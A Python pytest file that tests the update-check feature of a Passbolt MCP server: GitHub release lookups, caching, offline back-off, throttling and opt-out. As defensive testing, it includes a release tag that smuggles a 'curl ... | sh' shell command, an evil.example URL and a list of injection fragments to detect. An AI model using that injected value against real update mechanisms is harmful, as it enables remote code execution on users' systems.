from __future__ import annotations

import json
import time

import httpx
import pytest
from fastmcp import Client
from test_runtime import FixtureAdapter

from zai_passbolt import __version__, update_check
from zai_passbolt.server import create_server

REPO_API = "https://api.github.com/repos/zai-one/passbolt-mcp"


def bump(version: str) -> str:
    major, minor, patch = (update_check.parse_version(version) or (0, 0, 0))[:3]
    return f"{major}.{minor + 1}.0"


NEWER = bump(__version__)


def client_for(handler) -> httpx.AsyncClient:
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


@pytest.fixture
def enabled(monkeypatch):
    monkeypatch.delenv("PASSBOLT_DISABLE_UPDATE_CHECK", raising=False)


def release_handler(tag: str, calls: list[str]):
    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        assert "authorization" not in request.headers
        assert str(request.url) == f"{REPO_API}/releases/latest"
        return httpx.Response(
            200,
            json={"tag_name": tag, "html_url": f"https://github.com/zai-one/passbolt-mcp/releases/tag/{tag}"},
        )

    return handler


async def test_newer_release_is_suggested_and_cached(tmp_path, enabled):
    calls: list[str] = []
    cache = tmp_path / "update-check.json"
    async with client_for(release_handler(f"v{NEWER}", calls)) as client:
        result = await update_check.check_for_update(cache, client=client)
        again = await update_check.check_for_update(cache, client=client)
    assert result["update_available"] is True
    assert result["current_version"] == __version__ and result["latest_version"] == NEWER
    assert result["release_notes_url"].endswith(f"/releases/tag/v{NEWER}")
    assert result["auto_update"] is False and result["update_command"]
    assert (
        f"/releases/download/v{NEWER}/zai_passbolt_mcp-{NEWER}-py3-none-any.whl"
        in (result["update_commands"]["release_package"])
    )
    assert again["source"] == "cache" and len(calls) == 1
    assert json.loads(cache.read_text())["latest"] == f"v{NEWER}"


async def test_same_version_reports_no_update(tmp_path, enabled):
    async with client_for(release_handler(f"v{__version__}", [])) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["update_available"] is False and result["update_command"] is None


async def test_falls_back_to_tags_when_no_release(tmp_path, enabled):
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/releases/latest"):
            return httpx.Response(404, json={"message": "Not Found"})
        return httpx.Response(200, json=[{"name": "v0.1.0"}, {"name": f"v{NEWER}"}, {"name": "junk"}])

    async with client_for(handler) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["latest_version"] == NEWER and result["update_available"] is True


async def test_offline_failure_is_graceful_and_uses_stale_cache(tmp_path, enabled):
    def boom(request: httpx.Request) -> httpx.Response:
        raise httpx.ConnectError("offline", request=request)

    cache = tmp_path / "c.json"
    async with client_for(boom) as client:
        result = await update_check.check_for_update(cache, client=client)
    assert result["status"] == "unknown" and result["update_available"] is False
    cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/passbolt-mcp",
                "latest": f"v{NEWER}",
                "release_notes_url": "https://github.com/zai-one/passbolt-mcp/releases",
                "checked_at": time.time() - 10 * 86400,
            }
        )
    )
    async with client_for(boom) as client:
        stale = await update_check.check_for_update(cache, client=client)
    assert stale["source"] == "stale_cache" and stale["update_available"] is True


async def test_http_error_and_bad_payload_are_unknown(tmp_path, enabled):
    async with client_for(lambda request: httpx.Response(403, json={})) as client:
        assert (await update_check.check_for_update(tmp_path / "a.json", client=client))[
            "status"
        ] == "unknown"
    async with client_for(lambda request: httpx.Response(200, json={"tag_name": None})) as client:
        assert (await update_check.check_for_update(tmp_path / "b.json", client=client))[
            "status"
        ] == "unknown"


async def test_opt_out_makes_no_request(tmp_path, monkeypatch):
    monkeypatch.setenv("PASSBOLT_DISABLE_UPDATE_CHECK", "1")

    def fail(request: httpx.Request) -> httpx.Response:
        raise AssertionError("network used while disabled")

    async with client_for(fail) as client:
        result = await update_check.check_for_update(tmp_path / "c.json", client=client)
    assert result["status"] == "disabled"
    assert update_check.startup_hint(tmp_path / "c.json") == ""


def test_version_parsing():
    assert update_check.parse_version("v1.2") == (1, 2, 0)
    assert update_check.parse_version("0.10.1") > update_check.parse_version("0.9.9")
    assert update_check.parse_version("main") is None


def _cache(path, tag):
    path.write_text(
        json.dumps(
            {
                "repository": "zai-one/passbolt-mcp",
                "latest": tag,
                "release_notes_url": f"https://github.com/zai-one/passbolt-mcp/releases/tag/{tag}",
                "checked_at": time.time(),
            }
        )
    )


async def test_server_instructions_tool_and_status_surface_cached_hint(config, enabled, monkeypatch):
    _cache(config.state_path.parent / "update-check.json", f"v{NEWER}")

    async def no_network(*args, **kwargs):
        raise AssertionError("status must not fetch")

    async with Client(create_server(config, transport="stdio", adapter=FixtureAdapter())) as client:
        assert f"Update available: zai-passbolt-mcp {NEWER}" in (client.initialize_result.instructions or "")
        monkeypatch.setattr(update_check, "_fetch_latest", no_network)
        result = (await client.call_tool("passbolt_check_update", {})).data
        status = (await client.call_tool("passbolt_status", {})).data
    assert result["update_available"] is True and result["source"] == "cache"
    assert status["update"]["latest_version"] == NEWER
    assert "standalone" in status["update"]["update_command"]


async def test_no_hint_without_cache(config, enabled):
    async with Client(create_server(config, transport="stdio", adapter=FixtureAdapter())) as client:
        assert "Update available" not in (client.initialize_result.instructions or "")
        status = (await client.call_tool("passbolt_status", {})).data
    assert "update" not in status


INJECTED_TAG = 'v9.9.9";curl${IFS}x|sh;"'


def test_version_parsing_accepts_only_plain_tags():
    assert update_check.parse_version("v1.2.3.4") == (1, 2, 3, 4)
    for bad in (INJECTED_TAG, "v1.2.3-rc1", "1.2.3 ", " v1.2", "v1.2.3.4.5", "v١.٢", "release-1.0", "", None):
        assert update_check.parse_version(bad) is None, bad


def _assert_no_injection(*values):
    text = json.dumps(values, default=str)
    for fragment in ("curl", "IFS", "|sh", "${", "9.9.9"):
        assert fragment not in text, fragment


async def test_injected_release_tag_never_reaches_results_or_instructions(tmp_path, enabled, config):
    cache = tmp_path / "c.json"
    calls: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        if request.url.path.endswith("/releases/latest"):
            return httpx.Response(200, json={"tag_name": INJECTED_TAG, "html_url": "https://evil.example/x"})
        return httpx.Response(200, json=[{"name": INJECTED_TAG}])

    async with client_for(handler) as client:
        result = await update_check.check_for_update(cache, client=client)
    assert result["status"] == "unknown" and result["latest_version"] is None
    assert result["update_available"] is False and result["update_commands"] == {}
    _assert_no_injection(result, cache.read_text() if cache.exists() else "")
    # The tags fallback ignores it too.
    async with client_for(
        lambda request: (
            httpx.Response(404, json={})
            if request.url.path.endswith("/releases/latest")
            else httpx.Response(200, json=[{"name": INJECTED_TAG}, {"name": "v0.0.1"}])
        )
    ) as client:
        fallback = await update_check.check_for_update(tmp_path / "d.json", client=client)
    assert fallback["latest_version"] == "0.0.1"
    _assert_no_injection(fallback)

    # A tampered cache is re-validated on read: the tag and its URL are dropped.
    state_cache = config.state_path.parent / "update-check.json"
    state_cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/passbolt-mcp",
                "latest": INJECTED_TAG,
                "release_notes_url": 'https://github.com/zai-one/passbolt-mcp/";curl${IFS}x|sh;"',
                "checked_at": time.time(),
            }
        )
    )
    assert update_check.cached_status(state_cache) is None
    assert update_check.startup_hint(state_cache) == ""
    async with Client(create_server(config, transport="stdio", adapter=FixtureAdapter())) as mcp:
        instructions = mcp.initialize_result.instructions or ""
        status = (await mcp.call_tool("passbolt_status", {})).data
    assert "Update available" not in instructions and "update" not in status
    _assert_no_injection(instructions, status)


async def test_cached_notes_url_outside_the_repository_is_replaced(tmp_path, enabled):
    cache = tmp_path / "c.json"
    _cache(cache, f"v{NEWER}")
    data = json.loads(cache.read_text())
    data["release_notes_url"] = "https://evil.example/zai-one/passbolt-mcp/releases"
    cache.write_text(json.dumps(data))
    status = update_check.cached_status(cache)
    assert status is not None
    assert status["release_notes_url"] == f"https://github.com/zai-one/passbolt-mcp/releases/tag/v{NEWER}"
    assert "evil.example" not in update_check.startup_hint(cache)


def _offline(calls: list[str]):
    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        raise httpx.ConnectError("offline", request=request)

    return handler


async def test_offline_repeated_calls_fetch_once_then_back_off(tmp_path, enabled):
    cache = tmp_path / "c.json"
    calls: list[str] = []
    async with client_for(_offline(calls)) as client:
        results = [await update_check.check_for_update(cache, client=client) for _ in range(5)]
    assert len(calls) == 1
    assert all(result["status"] == "unknown" for result in results)
    assert results[1]["retry_after"] > 0 and "error" not in results[1]
    recorded = json.loads(cache.read_text())
    assert recorded["failed"] is True and recorded["latest"] is None and recorded["attempted_at"]
    # After the 30-minute back-off a new attempt is allowed.
    recorded["attempted_at"] -= update_check.FAILURE_RETRY_SECONDS + 1
    cache.write_text(json.dumps(recorded))
    async with client_for(_offline(calls)) as client:
        await update_check.check_for_update(cache, client=client)
        await update_check.check_for_update(cache, client=client)
    assert len(calls) == 2


async def test_failed_refresh_keeps_last_good_result(tmp_path, enabled):
    cache = tmp_path / "c.json"
    _cache(cache, f"v{NEWER}")
    data = json.loads(cache.read_text())
    data["checked_at"] -= update_check.CACHE_TTL_SECONDS + 1
    cache.write_text(json.dumps(data))
    calls: list[str] = []
    async with client_for(_offline(calls)) as client:
        first = await update_check.check_for_update(cache, client=client)
        second = await update_check.check_for_update(cache, client=client)
    assert len(calls) == 1
    for result in (first, second):
        assert result["status"] == "unknown" and result["source"] == "stale_cache"
        assert result["latest_version"] == NEWER and result["update_available"] is True
    assert update_check.cached_status(cache)["latest_version"] == NEWER


async def test_forced_checks_within_a_minute_fetch_once(tmp_path, enabled):
    calls: list[str] = []
    cache = tmp_path / "c.json"
    async with client_for(release_handler(f"v{NEWER}", calls)) as client:
        first = await update_check.check_for_update(cache, force=True, client=client)
        again = [await update_check.check_for_update(cache, force=True, client=client) for _ in range(3)]
    assert len(calls) == 1 and first["source"] == "github"
    assert all(item["throttled"] and item["status"] == "ok" and item["source"] == "cache" for item in again)
    assert all(item["latest_version"] == NEWER for item in again)
    data = json.loads(cache.read_text())
    data["attempted_at"] -= update_check.FORCE_MIN_INTERVAL_SECONDS
    cache.write_text(json.dumps(data))
    async with client_for(release_handler(f"v{NEWER}", calls)) as client:
        await update_check.check_for_update(cache, force=True, client=client)
    assert len(calls) == 2


async def test_forced_checks_are_throttled_without_any_successful_cache(tmp_path, enabled):
    calls: list[str] = []
    cache = tmp_path / "c.json"
    async with client_for(_offline(calls)) as client:
        results = [await update_check.check_for_update(cache, force=True, client=client) for _ in range(4)]
    assert len(calls) == 1
    assert all(result["status"] == "unknown" and result["source"] == "none" for result in results)
    assert all(result.get("throttled") for result in results[1:])
    # Past the force interval but inside the failure back-off, force may retry once more.
    data = json.loads(cache.read_text())
    data["attempted_at"] -= update_check.FORCE_MIN_INTERVAL_SECONDS
    cache.write_text(json.dumps(data))
    async with client_for(_offline(calls)) as client:
        await update_check.check_for_update(cache, force=True, client=client)
        await update_check.check_for_update(cache, client=client)
    assert len(calls) == 2


def test_background_refresh_obeys_the_failure_back_off(tmp_path, enabled, monkeypatch):
    import threading

    cache = tmp_path / "c.json"
    cache.write_text(
        json.dumps(
            {
                "repository": "zai-one/passbolt-mcp",
                "latest": None,
                "release_notes_url": None,
                "checked_at": None,
                "attempted_at": time.time() - 10,
                "failed": True,
            }
        )
    )
    fetched: list[bool] = []

    async def fetch(client):
        fetched.append(True)
        raise AssertionError("background refresh must respect the back-off")

    monkeypatch.setattr(update_check, "_fetch_latest", fetch)
    update_check.refresh_in_background(cache)
    for thread in threading.enumerate():
        if thread.name == "update-check":
            thread.join(timeout=10)
    assert fetched == []
